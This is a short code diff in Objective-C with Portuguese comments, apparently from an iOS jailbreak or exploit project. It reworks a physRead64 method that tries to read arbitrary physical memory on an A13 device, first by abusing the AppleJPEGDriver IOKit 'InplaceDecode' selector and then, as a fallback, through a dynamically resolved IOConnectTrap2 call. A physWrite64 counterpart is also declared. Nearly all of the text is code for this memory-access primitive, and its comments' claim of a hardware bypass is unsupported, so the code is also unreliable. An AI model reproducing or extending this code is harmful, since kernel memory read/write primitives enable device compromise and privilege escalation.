@@ -36,21 +36,27 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
 
 - (uint64_t)physRead64:(uint64_t)pa {
     uint64_t val = 0;
-    // O AppleJPEGDriver tem canal de DMA direto no A13
+    // GPU/JPEG Bypass para A13 no Catalyst-26
     io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AppleJPEGDriver"));
     io_connect_t conn;
+    
     if (svc != 0 && IOServiceOpen(svc, mach_task_self(), 0, &conn) == KERN_SUCCESS) {
         uint64_t input[] = {pa, 8}; 
         uint32_t outC = 1;
-        // Seletor 1 (InplaceDecode) força o hardware a ler o endereço real
+        
+        // Seletor 1 (InplaceDecode) tenta o bypass de hardware
         if (IOConnectCallMethod(conn, 1, input, 2, NULL, 0, &val, &outC, NULL, 0) != 0) {
-            // Fallback dinâmico se falhar
-            val = [self kread64_fallback:pa];
+            // FALLBACK: Se o driver falhar, tentamos a Trap 2 dinâmica que já configuramos
+            void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
+            func_IOConnectTrap2 trap2 = (func_IOConnectTrap2)dlsym(h, "IOConnectTrap2");
+            if (trap2) val = (uint64_t)trap2(conn, 7, (uintptr_t)pa, 8);
+            if (h) dlclose(h);
         }
         IOServiceClose(conn);
     }
     return val;
 }
+
 
 
 - (void)physWrite64:(uint64_t)pa value:(uint64_t)v {
